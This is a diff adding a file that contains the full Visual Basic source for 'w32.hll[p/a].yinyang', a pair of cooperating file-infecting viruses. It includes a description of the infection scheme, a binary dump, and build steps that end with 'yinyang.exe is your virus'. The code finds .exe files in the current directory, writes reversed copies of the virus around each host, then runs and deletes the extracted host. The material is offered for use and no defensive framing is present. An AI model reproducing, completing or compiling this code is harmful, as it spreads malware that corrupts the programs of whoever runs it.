@@ -1,0 +1,300 @@
+   ' w32.hll[p/a].yinyang
+   '
+   ' i'm proud to present w32.hll[p/a].yinyang.. 2 working viruses that co-works together in infecting files...
+   '
+   ' the whole virus searches for *.exe in current directory, and infects then in this manner..
+   '
+   ' ==================               ==============                              ===================
+   '    yin                               yang                                          yin
+   ' ==================   ----------> ==============     -----------------------> ===================
+   '    inverted yang                     host                                          host
+   ' ==================               ==============                              ===================
+   '                                   inverted yin                                   inverted yang
+   '                                  ==============                              ===================
+   '
+   ' excerpt of the virus dragged into notepad...
+   '
+   ' ---------------------------------------------------------------------------------------------------------------------------
+   ' MZ*       ÿÿ  ¸       @                                   ¸   º ´    Í!¸LÍ!This program cannot be run in DOS mode.$       ·ÛósiˆósiˆósiˆldˆòsiˆRichósiˆ                        PE  L â„=        à         P  àg   `   p [....
+   ' .....]           P     0XPU
+   ' Ì  p    œ  xÌ                                       €                     @    p   `   gÐ  P         à
+   '         =„áô L  EP                        ˆisóhciRˆisòˆdlˆisóˆisóˆisóÛ·       $
+   '
+   '
+   ' .edom SOD ni nur eb tonnac margorp
+   '  sihT!ÍL¸!Í  ´ º   ¸                                   @       ¸  ÿÿ       *ZM
+   ' ---------------------------------------------------------------------------------------------------------------------------
+   '
+   ' notice the two mz's?
+   '
+   ' here's the source code.. enjoy..
+   '
+   ' alcopaul
+   '
+   ' ==========
+   ' yin
+   ' ==========
+
+   Option Explicit
+   Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
+   Private Declare Function GetExitCodeProcess Lib "kernel32" (ByVal hProcess As Long, lpExitCode As Long) As Long
+   Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
+   Private iResult As Long
+   Private hProg As Long
+   Private idProg As Long
+   Private iExit As Long
+   Const STILL_ACTIVE As Long = &H103
+   Const PROCESS_ALL_ACCESS As Long = &H1F0FFF
+   Sub Main()
+   On Error Resume Next
+   Dim vdir As String
+   Dim sfile As String
+   Dim a As String
+   Dim arr1
+   Dim lenhost As String
+   Dim vc As String
+   Dim mark As String
+   Dim host
+   Dim hdlen As String
+   Dim hostlen As String
+   Dim virlen As String
+   Dim buffhdlen As String
+   Dim buffhostlen As String
+   Dim buffvirlen As String
+   Dim lost As String
+   vdir = App.Path
+   If Right(vdir, 1) <> "\" Then vdir = vdir & "\"
+   sfile = Dir$(vdir & "*.exe")
+   While sfile <> ""
+   a = a & sfile & "/"
+   sfile = Dir$
+   Wend
+   arr1 = Split(a, "/")
+   For Each host In arr1
+   Open vdir & host For Binary Access Read As #1
+   lenhost = (LOF(1))
+   vc = Space(lenhost)
+   Get #1, , vc
+   Close #1
+   mark = Right(vc, 2)
+   If mark <> "ZM" Then
+   GoTo notinfected
+   Else
+   GoTo gggoop
+   End If
+   notinfected:
+   virustime (vdir & host)
+   Exit For
+   gggoop:
+   Next host
+   Open vdir & App.EXEName & ".exe" For Binary Access Read As #1
+   hdlen = (6144)
+   hostlen = (LOF(1) - 12288)
+   virlen = (6144)
+   buffhdlen = Space(hdlen)
+   buffhostlen = Space(hostlen)
+   buffvirlen = Space(virlen)
+   Get #1, , buffhdlen
+   Get #1, , buffhostlen
+   Get #1, , buffvirlen
+   Close #1
+   Open vdir & "yin.exe" For Binary Access Write As #3
+   Put #3, , buffhostlen
+   Close #3
+   'borrowed from murkry's vb5 virus
+   idProg = Shell(vdir & "yin.exe " & Command, vbNormalFocus)
+   hProg = OpenProcess(PROCESS_ALL_ACCESS, False, idProg)
+   GetExitCodeProcess hProg, iExit
+   Do While iExit = STILL_ACTIVE
+   DoEvents
+   GetExitCodeProcess hProg, iExit
+   Loop
+   Kill vdir & "yin.exe"
+   MsgBox "w32.hllp.yin by alcopaul", vbInformation, "yinyang"
+   End Sub
+   Function virustime(hostpath As String)
+   On Error Resume Next
+   Dim ffile
+   Dim hostcode As String
+   Dim vir As String
+   Dim vircode As String
+   Dim header As String
+   Dim lost As String
+   Dim a2 As String
+   Dim a1 As String
+   vir = App.Path
+   If Right(vir, 1) <> "\" Then vir = vir & "\"
+   Open hostpath For Binary Access Read As #1
+   hostcode = Space(LOF(1))
+   Get #1, , hostcode
+   Close #1
+   Open vir & App.EXEName & ".exe" For Binary Access Read As #2
+   header = Space(6144)
+   lost = Space(LOF(2) - 12288)
+   vircode = Space(6144)
+   Get #2, , vircode
+   Get #2, , lost
+   Get #2, , header
+   Close #2
+   a1 = inv(vircode)
+   a2 = inv(header)
+   Open hostpath For Binary Access Write As #3
+   Put #3, , a2
+   Put #3, , hostcode
+   Put #3, , a1
+   Close #3
+   End Function
+   Function inv(str As String)
+   On Error Resume Next
+   Dim bbb As String, i As Long, x As Long, ccc As String, ddd As String, ggg As String, tct As String
+   bbb = Right(str, 1)
+   For i = 1 To Len(str)
+   DoEvents
+   x = x + 1
+   ccc = Mid(str, Len(str) - x, 1)
+   ddd = ddd & ccc
+   Next i
+   ggg = Mid(ddd, 1, Len(ddd) - 1)
+   tct = bbb & ggg
+   inv = tct
+   End Function
+
+
+   '=====
+   'yang
+   '=====
+
+   Option Explicit
+   Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
+   Private Declare Function GetExitCodeProcess Lib "kernel32" (ByVal hProcess As Long, lpExitCode As Long) As Long
+   Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
+   Private iResult As Long
+   Private hProg As Long
+   Private idProg As Long
+   Private iExit As Long
+   Const STILL_ACTIVE As Long = &H103
+   Const PROCESS_ALL_ACCESS As Long = &H1F0FFF
+   Sub Main()
+   On Error Resume Next
+   Dim vdir As String
+   Dim sfile As String
+   Dim a As String
+   Dim arr1
+   Dim lenhost As String
+   Dim vc As String
+   Dim mark As String
+   Dim host
+   Dim hdlen As String
+   Dim hostlen As String
+   Dim virlen As String
+   Dim buffhdlen As String
+   Dim buffhostlen As String
+   Dim buffvirlen As String
+   Dim lost As String
+   vdir = App.Path
+   If Right(vdir, 1) <> "\" Then vdir = vdir & "\"
+   sfile = Dir$(vdir & "*.exe")
+   While sfile <> ""
+   a = a & sfile & "/"
+   sfile = Dir$
+   Wend
+   arr1 = Split(a, "/")
+   For Each host In arr1
+   Open vdir & host For Binary Access Read As #1
+   lenhost = (LOF(1))
+   vc = Space(lenhost)
+   Get #1, , vc
+   Close #1
+   mark = Right(vc, 2)
+   If mark <> "ZM" Then
+   GoTo notinfected
+   Else
+   GoTo gggoop
+   End If
+   notinfected:
+   virustime (vdir & host)
+   Exit For
+   gggoop:
+   Next host
+   Open vdir & App.EXEName & ".exe" For Binary Access Read As #1
+   hdlen = (6144)
+   hostlen = (LOF(1) - 12288)
+   virlen = (6144)
+   buffhdlen = Space(hdlen)
+   buffhostlen = Space(hostlen)
+   buffvirlen = Space(virlen)
+   Get #1, , buffhdlen
+   Get #1, , buffhostlen
+   Get #1, , buffvirlen
+   Close #1
+   Open vdir & "yang.exe" For Binary Access Write As #3
+   Put #3, , buffhostlen
+   Close #3
+   'borrowed from murkry's vb5 virus
+   idProg = Shell(vdir & "yang.exe " & Command, vbNormalFocus)
+   hProg = OpenProcess(PROCESS_ALL_ACCESS, False, idProg)
+   GetExitCodeProcess hProg, iExit
+   Do While iExit = STILL_ACTIVE
+   DoEvents
+   GetExitCodeProcess hProg, iExit
+   Loop
+   Kill vdir & "yang.exe"
+   MsgBox "w32.hllp.yang by alcopaul", vbInformation, "yinyang"
+   End Sub
+   Function virustime(hostpath As String)
+   On Error Resume Next
+   Dim ffile
+   Dim hostcode As String
+   Dim vir As String
+   Dim vircode As String
+   Dim header As String
+   Dim lost As String
+   Dim a2 As String
+   Dim a1 As String
+   vir = App.Path
+   If Right(vir, 1) <> "\" Then vir = vir & "\"
+   Open hostpath For Binary Access Read As #1
+   hostcode = Space(LOF(1))
+   Get #1, , hostcode
+   Close #1
+   Open vir & App.EXEName & ".exe" For Binary Access Read As #2
+   header = Space(6144)
+   lost = Space(LOF(2) - 12288)
+   vircode = Space(6144)
+   Get #2, , vircode
+   Get #2, , lost
+   Get #2, , header
+   Close #2
+   a1 = inv(vircode)
+   a2 = inv(header)
+   Open hostpath For Binary Access Write As #3
+   Put #3, , a2
+   Put #3, , hostcode
+   Put #3, , a1
+   Close #3
+   End Function
+   Function inv(str As String)
+   On Error Resume Next
+   Dim bbb As String, i As Long, x As Long, ccc As String, ddd As String, ggg As String, tct As String
+   bbb = Right(str, 1)
+   For i = 1 To Len(str)
+   DoEvents
+   x = x + 1
+   ccc = Mid(str, Len(str) - x, 1)
+   ddd = ddd & ccc
+   Next i
+   ggg = Mid(ddd, 1, Len(ddd) - 1)
+   tct = bbb & ggg
+   inv = tct
+   End Function
+
+   =========
+
+   compile both to p-code, upx and should yield a 6144 executable each..
+   flip.com yang.exe (flip.com is file backmasker made by me..)
+   copy /b yin.exe+yang.exe yinyang.exe
+   del yin.exe
+   del yang.exe
+   !yinyang.exe is your virus..
+
+   ============
